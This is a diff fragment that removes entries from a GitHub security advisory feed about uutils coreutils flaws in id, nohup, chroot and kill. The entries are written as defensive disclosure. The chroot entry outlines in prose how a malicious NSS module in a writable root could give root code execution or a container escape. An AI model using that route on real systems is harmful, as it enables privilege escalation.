-            <uri>https://github.com/advisories/GHSA-wq63-vh5h-pr5p</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-22T18:31:46.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[coreutils] uutils coreutils's User Interface (UI) Misrepresents Critical Information]]></title>
-        <id>https://github.com/advisories/GHSA-53gr-wmf4-8hh3</id>
-        <link href="https://github.com/advisories/GHSA-53gr-wmf4-8hh3"/>
-        <updated>2026-04-30T17:52:14.000Z</updated>
-        <content type="html"><![CDATA[<p>The id utility in uutils coreutils exhibits incorrect behavior in its "pretty print" output when the real UID and effective UID differ. The implementation incorrectly uses the effective GID instead of the effective UID when performing a name lookup for the effective user. This results in misleading diagnostic output that can cause automated scripts or system administrators to make incorrect decisions regarding file permissions or access control.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35371">https://nvd.nist.gov/vuln/detail/CVE-2026-35371</a></li>
-<li><a href="https://github.com/uutils/coreutils/issues/10006">https://github.com/uutils/coreutils/issues/10006</a></li>
-<li><a href="https://github.com/advisories/GHSA-53gr-wmf4-8hh3">https://github.com/advisories/GHSA-53gr-wmf4-8hh3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-53gr-wmf4-8hh3</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-04-22T18:31:46.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[coreutils] uutils coreutils has an Incorrect Authorization issue]]></title>
-        <id>https://github.com/advisories/GHSA-q94g-3gcf-66x7</id>
-        <link href="https://github.com/advisories/GHSA-q94g-3gcf-66x7"/>
-        <updated>2026-04-30T17:51:18.000Z</updated>
-        <content type="html"><![CDATA[<p>The id utility in uutils coreutils miscalculates the groups= section of its output. The implementation uses a user's real GID instead of their effective GID to compute the group list, leading to potentially divergent output compared to GNU coreutils. Because many scripts and automated processes rely on the output of id to make security-critical access-control or permission decisions, this discrepancy can lead to unauthorized access or security misconfigurations.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35370">https://nvd.nist.gov/vuln/detail/CVE-2026-35370</a></li>
-<li><a href="https://github.com/uutils/coreutils/issues/10006">https://github.com/uutils/coreutils/issues/10006</a></li>
-<li><a href="https://github.com/advisories/GHSA-q94g-3gcf-66x7">https://github.com/advisories/GHSA-q94g-3gcf-66x7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-q94g-3gcf-66x7</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-22T18:31:46.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[coreutils] uutils coreutils has an Incorrect Permission Assignment for Critical Resource]]></title>
-        <id>https://github.com/advisories/GHSA-5hgf-628x-mcqf</id>
-        <link href="https://github.com/advisories/GHSA-5hgf-628x-mcqf"/>
-        <updated>2026-04-30T17:50:53.000Z</updated>
-        <content type="html"><![CDATA[<p>The nohup utility in uutils coreutils creates its default output file, nohup.out, without specifying explicit restricted permissions. This causes the file to inherit umask-based permissions, typically resulting in a world-readable file (0644). In multi-user environments, this allows any user on the system to read the captured stdout/stderr output of a command, potentially exposing sensitive information. This behavior diverges from GNU coreutils, which creates nohup.out with owner-only (0600) permissions.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35367">https://nvd.nist.gov/vuln/detail/CVE-2026-35367</a></li>
-<li><a href="https://github.com/uutils/coreutils/issues/10021">https://github.com/uutils/coreutils/issues/10021</a></li>
-<li><a href="https://github.com/advisories/GHSA-5hgf-628x-mcqf">https://github.com/advisories/GHSA-5hgf-628x-mcqf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5hgf-628x-mcqf</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-04-22T18:31:45.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[coreutils] uutils coreutils has an Untrusted Search Path]]></title>
-        <id>https://github.com/advisories/GHSA-mh5c-xrmh-m794</id>
-        <link href="https://github.com/advisories/GHSA-mh5c-xrmh-m794"/>
-        <updated>2026-04-30T17:50:13.000Z</updated>
-        <content type="html"><![CDATA[<p>A vulnerability exists in the chroot utility of uutils coreutils when using the --userspec option. The utility resolves the user specification via getpwnam() after entering the chroot but before dropping root privileges. On glibc-based systems, this can trigger the Name Service Switch (NSS) to load shared libraries (e.g., libnss_*.so.2) from the new root directory. If the NEWROOT is writable by an attacker, they can inject a malicious NSS module to execute arbitrary code as root, facilitating a full container escape or privilege escalation.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35368">https://nvd.nist.gov/vuln/detail/CVE-2026-35368</a></li>
-<li><a href="https://github.com/uutils/coreutils/issues/10327">https://github.com/uutils/coreutils/issues/10327</a></li>
-<li><a href="https://github.com/advisories/GHSA-mh5c-xrmh-m794">https://github.com/advisories/GHSA-mh5c-xrmh-m794</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mh5c-xrmh-m794</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-22T18:31:45.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[coreutils] uutils coreutils has an Improper Input Validation issue]]></title>
-        <id>https://github.com/advisories/GHSA-gpcg-h6x2-c26p</id>
-        <link href="https://github.com/advisories/GHSA-gpcg-h6x2-c26p"/>
-        <updated>2026-04-30T17:49:16.000Z</updated>
-        <content type="html"><![CDATA[<p>An argument parsing error in the kill utility of uutils coreutils incorrectly interprets kill -1 as a request to send the default signal (SIGTERM) to PID -1. Sending a signal to PID -1 causes the kernel to terminate all processes visible to the caller, potentially leading to a system crash or massive process termination. This differs from GNU coreutils, which correctly recognizes -1 as a signal number in this context and would instead report a missing PID argument.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35369">https://nvd.nist.gov/vuln/detail/CVE-2026-35369</a></li>
-<li><a href="https://github.com/uutils/coreutils/pull/9700">https://github.com/uutils/coreutils/pull/9700</a></li>
-<li><a href="https://github.com/uutils/coreutils/releases/tag/0.6.0">https://github.com/uutils/coreutils/releases/tag/0.6.0</a></li>
-<li><a href="https://github.com/uutils/coreutils/commit/2d3aebce6712841bc08b9b94e9078be50a25fc10">https://github.com/uutils/coreutils/commit/2d3aebce6712841bc08b9b94e9078be50a25fc10</a></li>
-<li><a href="https://github.com/advisories/GHSA-gpcg-h6x2-c26p">https://github.com/advisories/GHSA-gpcg-h6x2-c26p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gpcg-h6x2-c26p</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-22T18:31:45.000Z</published>
     </entry>
 </feed>
